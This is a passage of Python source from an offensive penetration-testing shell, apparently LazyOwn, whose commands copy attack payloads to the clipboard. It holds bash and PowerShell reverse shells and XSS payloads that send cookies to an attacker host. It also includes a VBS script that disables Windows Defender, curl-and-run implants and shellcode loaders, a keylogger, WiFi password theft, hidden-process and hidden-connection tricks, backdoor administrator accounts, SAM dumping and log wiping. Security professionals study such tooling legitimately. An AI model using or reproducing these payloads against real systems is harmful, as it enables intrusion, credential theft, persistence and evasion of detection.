            - If 'clean', it resets the command prompt to its default format.
            - If any other value, it updates the command prompt to include the `rhost` and current working directory.
        :type line: str
        :returns: None

        Manual execution:
        1. If `line` is 'clean':
        - The command prompt is reset to its default format.
        2. If `line` is any other value:
        - The command prompt is updated to show the `rhost` and the current working directory.
        - The `rhost` is copied to the clipboard using `xclip`.

        Dependencies:
        - The script uses `xclip` to copy the `rhost` to the clipboard.

        Example:
            rhost
            # This will copy the current `rhost` to the clipboard and update the prompt.

            rhost clean
            # This will reset the command prompt to its default format.

        Note:
            Ensure that the `rhost` is valid by checking it with the `check_rhost` function before copying it to the clipboard.
        """
        url   = self.params['url']
        rhost = self.params["rhost"]
        if not check_rhost(rhost):
            return
        if not url:
            print_error("url must be assign, use: assign url http://host.ext")
            return
        cwd = os.getcwd()
        if line == 'clean':
            self.custom_prompt = getprompt()
            self.prompt = f"{self.custom_prompt}"
        else:
            self.custom_prompt = getprompt().replace(']', f" ~{GREEN}{cwd}{YELLOW}]{YELLOW}[{MAGENTA}{rhost}{YELLOW}][{BLUE}{url}{YELLOW}]")
            self.prompt = f"{self.custom_prompt}"
            os.system(f"printf '{rhost}' | xclip -sel clip")
            print_msg(f"ip from payload: {rhost=}, copied to clipboard :) {RESET}")
        return


    def do_rrhost(self, line):
        """
        Updates the command prompt to include the remote host (rhost) and current working directory.

        This function performs two tasks:
        1. It updates the command prompt to include the `rhost` and the current working directory if `line` is not 'clean'.
        2. It resets the command prompt to its default format if `line` is 'clean'.

        Usage:
            rhost [clean]

        :param line: An optional argument that determines the behavior of the function:
            - If 'clean', it resets the command prompt to its default format.
            - If any other value, it updates the command prompt to include the `rhost` and current working directory.
        :type line: str
        :returns: None

        Manual execution:
        1. If `line` is 'clean':
        - The command prompt is reset to its default format.
        2. If `line` is any other value:
        - The command prompt is updated to show the `rhost` and the current working directory.

        Example:
            rhost
            # This will update the command prompt to include the `rhost` and current working directory.

            rhost clean
            # This will reset the command prompt to its default format.

        Note:
            Ensure that the `rhost` is valid by checking it with the `check_rhost` function before updating the prompt.
        """
        url = self.params['url']
        rhost = self.params["rhost"]

        if not check_rhost(rhost):
            return

        cwd = os.getcwd()

        if line == 'clean':
            self.custom_prompt = getprompt()
            self.prompt = f"{self.custom_prompt}"
        else:
            self.custom_prompt = getprompt().replace(']', f" ~{GREEN}{cwd}{YELLOW}]{BRIGHT_YELLOW}[{MAGENTA}{rhost}{BRIGHT_YELLOW}][{BRIGHT_BLUE}{url}{BRIGHT_YELLOW}]")
            self.prompt = f"{self.custom_prompt}"

        return

    @cmd2.with_category(miscellaneous_category)
    def do_banner(self, line):
        """Show the banner"""
        if NOBANNER is False:
            os.system("python3 banner.py")
            print_msg(
                f"    {BG_BLACK}{RED}{BANNER}{MAGENTA}Autor: {CYAN}grisUN0{RESET}"
            )

            print_msg(LazyOwnShell().intro)
        return

    @cmd2.with_category(exploitation_category)
    def do_py3ttyup(self, line):
        """
        Copies a Python reverse shell command to the clipboard.

        This function generates a Python command that uses the `pty` module to spawn a new shell and copies it to the clipboard. This is typically used for creating a TTY shell in a reverse shell situation.

        Usage:
            py3ttyup

        :param line: This parameter is not used in the function.
        :type line: str
        :returns: None

        Manual execution:
        1. The function creates a Python command with `pty.spawn` to open a shell.
        2. The command is copied to the clipboard using `xclip`.
        3. A message is printed to inform the user that the command has been copied.

        Dependencies:
        - The script uses `xclip` to copy the command to the clipboard.

        Example:
            py3ttyup
            # This will copy the Python command `python3 -c 'import pty; pty.spawn("/bin/bash")'` to the clipboard.

        Note:
            This command is often used in scenarios where you need a more interactive shell from a reverse shell connection.
        """

        self.cmd(
            'echo "python3 -c \'import pty;pty.spawn("/bin/bash")\'"| xclip -sel clip'
        )
        print_msg(
            'Try... echo "python3 -c \'import pty;pty.spawn("/bin/bash")\'"| xclip -sel clip # copied to clipboard :) '
        )
        return

    @cmd2.with_category(exploitation_category)
    def do_rev(self, line):
        """
        Copies a reverse shell payload to the clipboard.

        This function generates a reverse shell command that connects back to the specified host and port, and copies it to the clipboard. It also provides a way to execute the payload via a PHP-based web shell.

        Usage:
            rev

        :param line: This parameter is not used in the function.
        :type line: str
        :returns: None

        Manual execution:
        1. Ensure that `lhost`, `lport`, and `rhost` parameters are assign.
        2. The function generates a reverse shell command in Bash and prints instructions for using the payload.
        3. It also provides an example URL and PHP code snippet that decodes and executes the base64-encoded payload.
        4. The reverse shell command is copied to the clipboard using `xclip`.

        Dependencies:
        - The script uses `xclip` to copy the command to the clipboard.
        - Base64 encoding is used to obfuscate the payload.

        Example:
            rev
            # This will copy a reverse shell command to the clipboard and display instructions for its use.
        """

        lhost = self.params["lhost"]
        lport = self.params["lport"]
        rhost = self.params["rhost"]
        if not lhost or not lport or not rhost:
            print_error(f"rhost, lhost and lport must be assign.{RESET}")
            return

        print_msg(
            f"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' {MAGENTA}copied to cplipboard :D "
        )
        print_warn("<modo de uso>")
        print(
            f"http://{rhost}/?page=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/ "
        )
        print('<?shell_exec(base64_decode("')
        self.cmd(
            f"echo \"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\" | base64"
        )
        print('"));?>')
        print("+/tmp/shell.php")
        print_warn("</modo de uso>")
        os.system(
            f"echo \"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\" |  xclip -sel clip"
        )

        return

    @cmd2.with_category(exploitation_category)
    def do_img2cookie(self, line):
        """
        Copies a malicious image tag payload to the clipboard.

        This function crafts and copies two different image tag payloads designed to steal cookies from a target's browser. The payloads use JavaScript to send cookies to a specified host and port. The user is prompted to select which payload to copy to the clipboard.

        Usage:
            img2cookie

        :param line: This parameter is not used in the function.
        :type line: str
        :returns: None

        Manual execution:
        1. Ensure that `lhost`, `lport`, and `rhost` parameters are assign.
        2. The function generates two payloads:
        - Payload 1: A script that sends cookies to the specified host and port.
        - Payload 2: An image tag with an `onerror` event that fetches cookies and sends them to the specified host and port using Base64 encoding.
        3. The user is prompted to choose between the two payloads, which are then copied to the clipboard.

        Dependencies:
        - The script uses `xclip` to copy the payloads to the clipboard.
        - Ensure that `lhost`, `lport`, and `rhost` parameters are assign with appropriate values.

        Example:
            img2cookie
            # This will prompt you to select between two payloads. The chosen payload will be copied to the clipboard.
        """

        lhost = self.params.get("lhost")
        lport = self.params.get("lport")
        rhost = self.params.get("rhost")
        path = os.getcwd()
        filename = f"{path}/sessions/script.js"
        if not lhost or not lport or not rhost:
            print_error(f"rhost, lhost and lport must be assign.{RESET}")
            return

        print_msg(f"Crafting img payload...")

        js = """
        fetch('/api/info').then(response => response.text()).then(text => {
            fetch('http://{lhost}/log?' + btoa(text), {
                mode: 'no-cors'
            });
        });
        """.replace("        ",'').replace("{lhost}",lhost)
        with open(filename, "w") as f:
            f.write(js)

        # Payload 1
        command1 = f'echo "<script>new Image().src="http://{lhost}:80/cookie?c="+document.cookie;</script>" | xclip -sel clip'

        # Payload 2
        cmd = f"""fetch('http://{lhost}:80/?cookie='+document.cookie)"""
        utf8_encoded = cmd.encode("utf-8")
        base64_encoded = base64.b64encode(utf8_encoded)
        base64_string = base64_encoded.decode("utf-8").strip()
        command2 = f"echo \"<img src=x onerror=eval(atob('{base64_string}'))>\" | xclip -sel clip"

        # Payload 3
        secondary_payload = (
            f"<img src=\"1\" onerror=\"this.remove(); var s=document.createElement('script'); s.src='http://{lhost}/script.js'; document.body.appendChild(s);\">"
        )

        # Inform user and ask for selection
        print_warn("<modo_de_uso>")
        print_msg(f"Payload 1: {command1}")
        print_msg(f"Payload 2: {command2}")
        print_msg(f"Payload 3: {secondary_payload}")
        print_warn("</modo_de_uso>")

        choice = input(
            f"    {CYAN}[?] {MAGENTA}Which payload would you like to copy to the clipboard? (1, 2 or 3): {RESET}"
        ).strip()

        if choice == "1":
            self.cmd(command1)
            print_msg(f"Payload 1 copied to Clipboard")
        elif choice == "2":
            self.cmd(command2)
            print_msg(f"Payload 2 copied to Clipboard")
        elif choice == "3":
            copy2clip(secondary_payload)
            print_msg(f"Payload 3 copied to Clipboard")
        else:
            print_error("Invalid choice. Please select 1, 2 or 3.")

        return

    @cmd2.with_category(post_exploitation_category)
    def do_disableav(self, line):
        """
        Creates a Visual Basic Script (VBS) to attempt to disable antivirus settings.

        This function generates a VBS script designed to modify Windows Registry settings and run PowerShell commands to disable various Windows Defender antivirus features.

        Usage:
            disableav

        :param line: This parameter is not used in the function.
        :type line: str
        :returns: None

        Manual execution:
        1. The function writes a VBS script to a file named `aav.vbs` in the `sessions` directory.
        2. The script:
        - Elevates its privileges if not already running as an administrator.
        - Modifies Windows Registry settings to disable various Windows Defender features.
        - Outputs PowerShell commands to disable additional Windows Defender settings.

        The VBS script:
        - Uses `WScript.Shell` to modify the Windows Registry for disabling Windows Defender.
        - Calls PowerShell commands to further disable antivirus features.

        Dependencies:
        - The script must be executed on a Windows system where you have administrative privileges.
        - Ensure you have appropriate permissions to modify Windows Registry settings.

        Example:
            disableav
            # This will create the `aav.vbs` file with the specified content in the `sessions` directory.
        """


        file_aav = '''If Not WScript.Arguments.Named.Exists("elevate") Then
        CreateObject("Shell.Application").ShellExecute WScript.FullName _
            , """" & WScript.ScriptFullName & """ /elevate", "", "runas", 1
        WScript.Quit
        End If

        On Error Resume Next
        Set WshShell = CreateObject("WScript.Shell")
        WshShell.RegWrite "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware",1,"REG_DWORD"
        WshShell.RegWrite "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableBehaviorMonitoring","1","REG_DWORD"
        WshShell.RegWrite "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableOnAccessProtection","1","REG_DWORD"
        WshShell.RegWrite "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableScanOnRealtimeEnable","1","REG_DWORD"
        WshShell.RegWrite "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableRawWriteNotification","1","REG_DWORD"
        WshShell.RegWrite "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableIOAVProtection","1","REG_DWORD"
        WshShell.RegWrite "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableBehaviorMonitoring","1","REG_DWORD"

        WScript.Sleep 100

        outputMessage("Set-MpPreference -DisableRealtimeMonitoring $true")
        outputMessage("Set-MpPreference -DisableBehaviorMonitoring $true")
        outputMessage("Set-MpPreference -DisableBlockAtFirstSeen $true")
        outputMessage("Set-MpPreference -DisableIOAVProtection $true")
        outputMessage("Set-MpPreference -DisableScriptScanning $true")
        outputMessage("Set-MpPreference -SubmitSamplesConsent 2")
        outputMessage("Set-MpPreference -MAPSReporting 0")
        outputMessage("Set-MpPreference -HighThreatDefaultAction 6 -Force")
        outputMessage("Set-MpPreference -ModerateThreatDefaultAction 6")
        outputMessage("Set-MpPreference -LowThreatDefaultAction 6")
        outputMessage("Set-MpPreference -SevereThreatDefaultAction 6")


        Sub outputMessage(byval args)
        On Error Resume Next
        Set objShell = CreateObject("Wscript.shell")
        objShell.run("powershell " + args), 0
        End Sub'''.replace("        ", "")
        filename = "sessions/aav.vbs"
        print_msg(f"new file in {filename} '")
        with open(filename, "w") as f:
            f.write(file_aav)
        f.close()
        print_msg(
            f"Archivo {filename} creado con èxito en el directorio sessions con contenido: {file_aav} "
        )
        return

    @cmd2.with_category(persistence_category)
    def do_conptyshell(self, line):
        """
        Downloads ConPtyShell and prepares a PowerShell command for remote access.

        This function downloads the ConPtyShell PowerShell script and ZIP archive to the `sessions` directory and copies a PowerShell command to the clipboard for easy execution.

        Usage:
            conptyshell

        :param line: This parameter is not used in the function. The required host and port are retrieved from the `params` dictionary.
        :type line: str
        :returns: None

        Manual execution:
        1. Ensure that the `lhost` and `lport` parameters are assign with the local host and port for the reverse shell.
        2. The function downloads `Invoke-ConPtyShell.ps1` and `ConPtyShell.zip` to the `sessions` directory.
        3. Constructs a PowerShell command to run `Invoke-ConPtyShell.ps1` with the specified local IP and port.
        4. Copies the constructed command to the clipboard using `xclip`.

        The constructed PowerShell command:
        - Uses `Invoke-ConPtyShell.ps1` to establish a reverse shell connection to the specified `lhost` and `lport`.
        - Sets the PowerShell execution policy to bypass and specifies the dimensions of the terminal window.

        Dependencies:
        - `wget`: For downloading files from the internet.
        - `xclip`: For copying commands to the clipboard.
        - Ensure `ConPtyShell` script and ZIP are compatible with your environment.

        Example:
            conptyshell
            # This will download the required files and copy the PowerShell command to the clipboard.
        """

        lhost = self.params["lhost"]
        lport = self.params["lport"]
        if not lhost or not lport:
            print_error(f"lhost and lport must be assign.{RESET}")
            return

        self.cmd(
            "cd sessions && wget https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 && wget https://github.com/antonioCoco/ConPtyShell/releases/download/1.5/ConPtyShell.zip"
        )
        cmd = f"""IEX(New-Object New.WebClient).downloadString('http://{lhost}/Invoke-ConPtyShell.ps1') ; powershell.exe -NoProfile -ExecutionPolicy Bypass -File 'Invoke-ConPtyShell  -RemoteIp {lhost} -RemotePort {lport} -Rows 24 -Cols 135'"""
        self.cmd(f"echo '{cmd}' |  xclip -sel clip")
        print_msg(f"{cmd} {YELLOW} Copied to clipboard :D {RESET}")
        return

    @cmd2.with_category(persistence_category)
    def do_pwncatcs(self, line):
        """
        Runs `pwncat-cs` with the specified port for listening.

        This function starts a `pwncat-cs` listener on the specified local port. It can use a port defined in the `lport` parameter or a port provided as an argument.

        Usage:
            pwncatcs <port>

        :param line: The port number to use for the `pwncat-cs` listener. If not provided, it defaults to the `lport` parameter.
        :type line: str
        :returns: None

        Manual execution:
        1. Ensure that `pwncat-cs` is installed and accessible from your command line.
        2. The port number can either be provided as an argument or be assign in the `lport` parameter of the function.
        3. Run the function to start `pwncat-cs` on the specified port.

        If no port is provided as an argument, the function will use the port specified in the `lport` parameter. If a port is provided, it overrides the `lport` value.

        After starting the listener, the function prints a message indicating that `pwncat-cs` is running on the specified port and another message when the session is closed.

        Dependencies:
        - `pwncat-cs`: A tool used for creating reverse shells or bind shells.
        """

        lport = self.params["lport"]
        if not lport and not line:
            print_error(
                f"lport must be assign or pass the port by parameter like: nc 6666.{RESET}"
            )
            return
        if not line:
            print_msg(f"Try.. pwncat-cs -lp {lport}{RESET}")
            self.cmd(f"pwncat-cs -lp {lport}")
        else:
            print_msg(f"Try.. pwncat-cs -lp {line}{RESET}")
            self.cmd(f"pwncat-cs -lp {line}")
        print_msg(
            f"{RED}[*] {YELLOW} Shutdown pwncat-cs sessions in port {RED} [{lport}|{line}] {RESET}"
        )
        return

    @cmd2.with_category(persistence_category)
    def do_pwncat(self, line):
        """
        Runs `pwncat` with the specified port for listening. SELFINJECT

        This function starts a `pwncat` listener on the specified local port. It can use a port defined in the `lport` parameter or a port provided as an argument.

        Usage:
            pwncatcs <port>

        :param line: The port number to use for the `pwncat-cs` listener. If not provided, it defaults to the `lport` parameter.
        :type line: str
        :returns: None

        Manual execution:
        1. Ensure that `pwncat-cs` is installed and accessible from your command line.
        2. The port number can either be provided as an argument or be assign in the `lport` parameter of the function.
        3. Run the function to start `pwncat-cs` on the specified port.

        If no port is provided as an argument, the function will use the port specified in the `lport` parameter. If a port is provided, it overrides the `lport` value.

        After starting the listener, the function prints a message indicating that `pwncat-cs` is running on the specified port and another message when the session is closed.

        Dependencies:
        - `pwncat-cs`: A tool used for creating reverse shells or bind shells.
        """
        lhost = self.params["lhost"]
        lport = self.params["lport"]
        if not lport and not line:
            print_error(
                f"lport must be assign or pass the port by parameter like: nc 6666.{RESET}"
            )
            return
        if not line:
            print_msg(f"Try.. pwncat -l {lport} --self-inject /bin/bash:{lhost}:{lport}{RESET}")
            self.cmd(f"pwncat -l {lport} --self-inject /bin/bash:{lhost}:{lport}")
        else:
            print_msg(f"Try.. pwncat -l {line} --self-inject /bin/bash:{lhost}:{line}{RESET}")
            self.cmd(f"pwncat -l {line} --self-inject /bin/bash:{lhost}:{line}")
        print_msg(
            f"{RED}[*] {YELLOW} Shutdown pwncat sessions in port {RED} [{lport}|{line}] {RESET}"
        )
        return

    @cmd2.with_category(post_exploitation_category)
    def do_find(self, line=""):
        """
        Automates command execution based on a list of aliases and commands.

        1. Displays available aliases and their commands.
        2. Asks the user if they want to execute a specific command.
        3. If confirmed, displays the alias and command with a number.
        4. Executes the command and copies it to the clipboard.

        :param line: The command line input containing a keyword to filter the list of alias and command pairs.
        :type line: str
        :returns: None

        Manual execution:
        - Prepare the list of alias and command pairs in the format: "alias command".
        - Provide this list as input to the function.
        - Confirm the execution of the desired command when prompted.
        - Manually copy the command to the clipboard if needed.

        Note: Ensure `xclip` is installed and properly configured to use clipboard functionalities.
        """
        lhost = self.params["lhost"]
        lport = self.params["lport"]
        url = self.params["url"]
        domain = self.params["domain"]
        subdomain = self.params["subdomain"]
        asub = domain.split(".")
        name = asub[0]
        ext = asub[1]
        if not check_lhost(lhost):
            return
        commands_list = [
            ("LIN list file attributes on a Linux second extended file system", "lsattr -va"),
            ("LIN show opened ports", "netstat -an | grep -i listen"),
            ("LIN Find", "find / -type f \( -iname '*cred*' -o -iname '*pass*' -o -iname 'credentials' -o -iname 'password' \) -print -o -exec grep -i -l -e 'cred' -e 'pass' -e 'credentials' -e 'password' {} + 2>/dev/null"),
            ("LIN find all suid files", "find / -type f -perm -04000 -ls"),
            ("LIN find suid files in current dir", "find . -type f -perm -04000 -ls"),
            ("LIN find all sgid files", "find / -type f -perm -02000 -ls"),
            ("LIN find sgid files in current dir", "find . -type f -perm -02000 -ls"),
            ("LIN find config.inc.php files", "find / -type f -name config.inc.php"),
            ("LIN find config* files", "find / -type f -name \"config*\""),
            ("LIN find config* files in current dir", "find . -type f -name \"config*\""),
            ("LIN find all writable folders and files", "find / -perm -2 -ls"),
            ("LIN find all writable folders and files in current dir", "find . -perm -2 -ls"),
            ("LIN find all service.pwd files", "find / -type f -name service.pwd"),
            ("LIN find service.pwd files in current dir", "find . -type f -name service.pwd"),
            ("LIN find all .htpasswd files", "find / -type f -name .htpasswd"),
            ("LIN find .htpasswd files in current dir", "find . -type f -name .htpasswd"),
            ("LIN find all .bash_history files", "find / -type f -name .bash_history"),
            ("LIN find .bash_history files in current dir", "find . -type f -name .bash_history"),
            ("LIN find all .fetchmailrc files", "find / -type f -name .fetchmailrc"),
            ("LIN find .fetchmailrc files in current dir", "find . -type f -name .fetchmailrc"),
            ("LIN find .kdb files", "find / -type f -name *.kdb 2>/dev/null"),
            ("LIN LazyOwn Implant", f"curl http://{lhost}/r -o r && sh r &"),
            ("LIN ls", "ls -R | grep \":$\" | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/   /' -e 's/-/|/'"),
            ("LIN autorized keys", "cat /etc/passwd | grep -Ev \"^#\" | cut -d: -f6 | xargs -I {} sh -c 'file={}/.ssh/authorized_keys; if [ -f $file ]; then echo -n {} && echo \":\" && cat $file | grep . && echo; fi'"),
            ("LIN Timers", "systemctl list-timers"),
            ("LIN python", "python3 -c 'import os; os.setuid(0); self.cmd(\"/bin/bash\")'"),
            ("LIN python shellcode.bin", f'python3 -c "import base64, ctypes, urllib.request; url = \'http://{lhost}/shellcode.bin\'; response = urllib.request.urlopen(url); shellcode = base64.b64decode(response.read()); shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode)); shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p)); shellcode_func()"'),
            ("LIN pwnkit", f"curl -o PwnKit http://{lhost}/PwnKit ; chmod +x ./PwnKit ; ./PwnKit"),
            ("LIN pwnkit", f"curl -o PwnKit http://{lhost}/PwnKit32 ; chmod +x ./PwnKit ; ./PwnKit"),
            ("LIN Reverse Shell",f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>%261|nc {lhost} {lport} >/tmp/f"),
            ("LIN Get secret",f"nc -w 3 {lhost} {lport} < secret.zip"),
            ("LIN Python3 stable Shell","python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"),
            ("LIN SqlPAD Inyection","""{{ process.mainModule.require('child_process').exec('/bin/bash -c \\'bash -i >& /dev/tcp/{lhost}/5555 0>&1\\'') }}""".replace("LIN {lhost}", lhost)),
            ("LIN locate httpd.conf files", "locate httpd.conf"),
            ("LIN locate vhosts.conf files", "locate vhosts.conf"),
            ("LIN locate proftpd.conf files", "locate proftpd.conf"),
            ("LIN locate psybnc.conf files", "locate psybnc.conf"),
            ("LIN locate my.conf files", "locate my.conf"),
            ("LIN locate admin.php files", "locate admin.php"),
            ("LIN locate cfg.php files", "locate cfg.php"),
            ("LIN locate conf.php files", "locate conf.php"),
            ("LIN locate config.dat files", "locate config.dat"),
            ("LIN locate config.php files", "locate config.php"),
            ("LIN locate config.inc files", "locate config.inc"),
            ("LIN locate config.inc.php", "locate config.inc.php"),
            ("LIN locate config.default.php files", "locate config.default.php"),
            ("LIN locate config* files", "locate config"),
            ("LIN locate .conf files", "locate '.conf'"),
            ("LIN locate .pwd files", "locate '.pwd'"),
            ("LIN locate .sql files", "locate '.sql'"),
            ("LIN locate .htpasswd files", "locate '.htpasswd'"),
            ("LIN locate .bash_history files", "locate '.bash_history'"),
            ("LIN locate .mysql_history files", "locate '.mysql_history'"),
            ("LIN locate .fetchmailrc files", "locate '.fetchmailrc'"),
            ("LIN locate backup files", "locate backup"),
            ("LIN Hide connections", "echo 'netstat(){ command netstat \"$@\" | grep -Fv -e :31337 -e {lhost}; }' >> ~/.bashrc \ \n && touch -r /etc/passwd ~/.bashrc".replace("{lhost}",lhost)),
            ("LIN Hide connections Offuscated", "X='netstat(){ command netstat \"$@\" | grep -Fv -e :31337 -e {lhost}; }' \n echo \"eval \$(echo $(echo \"$X\" | xxd -ps -c1024)|xxd -r -ps) #Initialize PRNG\" >>~/.bashrc \ \n && touch -r /etc/passwd ~/.bashrc".replace("{lhost}",lhost)),
            ("LIN Hide connections binary Offuscated", "echo -e \"#! /bin/bash \n exec /usr/bin/netstat \"\$@\" | grep -Fv -e :22 -e {lhost}\" >/usr/local/sbin/netstat \ \n && chmod 755 /usr/local/sbin/netstat \ \n && touch -r /usr/bin/netstat /usr/local/sbin/netstat".replace("{lhost}",lhost)),
            ("Lin Hide process monrev as user", "echo 'ps(){ command ps \"$@\" | exec -a GREP grep -Fv -e monrev  -e GREP; }' >>~/.bashrc \ \n && touch -r /etc/passwd ~/.bashrc"),
            ("Lin Hide pid as Root", "hide() { \n     [[ -L /etc/mtab ]] && { cp /etc/mtab /etc/mtab.bak; mv /etc/mtab.bak /etc/mtab; } \n     _pid=${1:-$$} \n     [[ $_pid =~ ^[0-9]+$ ]] && { mount -n --bind /dev/shm /proc/$_pid && echo \"[THC] PID $_pid is now hidden\"; return; } \n     local _argstr \n     for _x in \"${@:2}\"; do _argstr+=\" '${_x//\'/\'\"\'\"\'}'\"; done \n     [[ $(bash -c \"ps -o stat= -p \$\$\") =~ \+ ]] || exec bash -c \"mount -n --bind /dev/shm /proc/\$\$; exec \"$1\" $_argstr\" \n    bash -c \"mount -n --bind /dev/shm /proc/\$\$; exec \"$1\" $_argstr\" \n }"),
            ("LIN locate priv iot files", "powershell -c \"$credential = import-clixml -path C:\\Data\\Users\\app\\iot-admin.xml;$credential.GetNetworkCredential().password\""),
            ("LIN lsof LISTEN PORTS", "sudo lsof -i -P -n | grep LISTEN"),
            ("LIN Screenshot", "xwd -root -out screenshot.xwd && convert screenshot.xwd screenshot.png"),
            ("SQL MSSQL exfiltrate files", "SELECT * FROM OPENROWSET(BULK N'C:\\users\\administrator\\desktop\\root.txt', SINGLE_CLOB) AS Contents"),
            ("WIN Enum App Lock Policy", "get-applockerpolicy -effective | select -expandproperty rulecollections"),
            ("WIN Enum Installer Policy", "reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated"),
            ("WIN Rrev Shell", '$sm=(New-Object Net.Sockets.TCPClient("{lhost}",{lport})).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}'.replace('{lhost}',lhost).replace('{lport}',str(lport))),
            ("WIN WifiGrab", "powershell -NoP -NonI -W Hidden -Exec Bypass \"(netsh wlan show profiles) | Select-String '\\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)} | Select-String 'Key Content\\W+\\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Export-Csv c:\\windows\\temp\\temp.csv; cp c:\\windows\\temp\\temp.csv -destination $((gwmi -Query \\\"Select * from Win32_LogicalDisk where VolumeName='USB_DRIVE_LABEL'\\\").DeviceID); ri c:\\windows\\temp\\temp.csv -force"),
            ("WIN Keylogger", "$code = {function My-Keypresses($Path=\"$env:temp\\mykeypress.txt\") \n{\n  $signatures = @\'\n[DllImport(\"user32.dll\", CharSet=CharSet.Auto, ExactSpelling=true)] \npublic static extern short GetAsyncKeyState(int virtualKeyCode); \n[DllImport(\"user32.dll\", CharSet=CharSet.Auto)]\npublic static extern int GetKeyboardState(byte[] keystate);\n[DllImport(\"user32.dll\", CharSet=CharSet.Auto)]\npublic static extern int MapVirtualKey(uint uCode, int uMapType);\n[DllImport(\"user32.dll\", CharSet=CharSet.Auto)]\npublic static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);\n\'@\n\n  $API = Add-Type -MemberDefinition $signatures -Name \'Win32\' -Namespace API -PassThru\n    \n  $null = New-Item -Path $Path -ItemType File -Force\n\n  try\n  {\n\n    while ($true) {\n      Start-Sleep -Milliseconds 40\n      \n      for ($ascii = 9; $ascii -le 254; $ascii++) {\n        $state = $API::GetAsyncKeyState($ascii)\n\n        if ($state -eq -32767) {\n          $null = [console]::CapsLock\n\n          $virtualKey = $API::MapVirtualKey($ascii, 3)\n\n          $kbstate = New-Object Byte[] 256\n          $checkkbstate = $API::GetKeyboardState($kbstate)\n\n          $mychar = New-Object -TypeName System.Text.StringBuilder\n\n          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)\n\n          if ($success) \n          {\n            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) \n          }\n        }\n      }\n    }\n  }\n  finally\n  {\n  }\n}}; $timeoutSeconds = 10; $j = Start-Job -ScriptBlock $code; if (Wait-Job $j -Timeout $timeoutSeconds) { Receive-Job $j }; Remove-Job -force $j"),
            ("WIN CREATE USER", "powershell $pass = ConvertTo-SecureString \"Lazy0wn#1\" -AsPlainText -Force; New-LocalUser \"lazyown\" -Password $pass; Add-LocalGroupMember -Group \"Administrators\" -Member \"lazyown\" "),
            ("WIN CREATE USER 2", "net user lazyown abc123! /add /domain ; net group \"Exchange Windows Permissions\" lazyown /add ; net localgroup \"Remote Management Users\" lazyown /add"),
            ("WIN Add-ObjectACL",f"$pass = convertto-securestring 'abc123!' -asplain -force ; $cred = new-object system.management.automation.pscredential('htb\lazyown', $pass) ; Add-DomainObjectAcl -Credential $cred -TargetIdentity \"DC={name}, DC={ext}\" -PrincipalIdentity lazyown -Rights DCSync"),
            ("WIN find password", "findstr /SIM /C:\"password\" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml"),
            ("WIN equivalent to whoami", "echo %USERPROFILE%"),
            ("WIN Find index.php in current dir", "dir /s /w /b index.php"),
            ("WIN Find *config*.php in current dir", "dir /s /w /b *config*.php"),
            ("WIN Show active connections", "netstat -an"),
            ("WIN Show running services", "net start"),
            ("WIN User accounts", "net user"),
            ("WIN Show computers", "net view"),
            ("WIN Hellbird", f"powershell -ep bypass -c \"IWR http://{lhost}/hellbird.ps1 -OutFile hellbird.ps1; .\hellbird.ps1 -Target windows -Url 'http://{lhost}/shellcode_windows.txt' -Key '0x33'\""),
            ("WIN domain trust", "nltest /domain_trusts"),
            ("WIN check relationship", "([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()"),
            ("WIN Trust all AD", "Get-ADTrust -Filter *"),
            ("WIN WinPwn", f"iex(new-object net.webclient).downloadstring('https://{lhost}/WinPwn.ps1')"),
            ("WIN Show computers", f"net use \\\\{rhost} \"{start_pass}\" /u:{domain}\\{start_user}"),
            ("WIN Save SAM 2", "C:\\Windows\\System32\\reg.exe save hklm\\sam sam.hive"),
            ("WIN Delete Logs", "wevtutil cl system ; wevtutil cl security ; wevtutil cl application"),
            ("WIN Save SAM", f"wmic /node:{rhost} /user:{start_user} /password:{start_pass} process call create \"cmd.exe /c reg save HKLM\\sam C:\\Windows\\Temp\\sam.save\""),
            ("WIN Save SECURITY", f"wmic /node:{rhost} /user:{start_user} /password:{start_pass} process call create \"cmd.exe /c reg save HKLM\\security C:\\Windows\\Temp\\security.save\""),
            ("WIN Save SYSTEM", f"wmic /node:{rhost} /user:{start_user} /password:{start_pass} process call create \"cmd.exe /c reg save HKLM\system C:\\Windows\\Temp\\system.save\""),
            ("WIN Show System Network", f"route print ; tracert -h 2 {rhost} ; ipconfig /displaydns"),
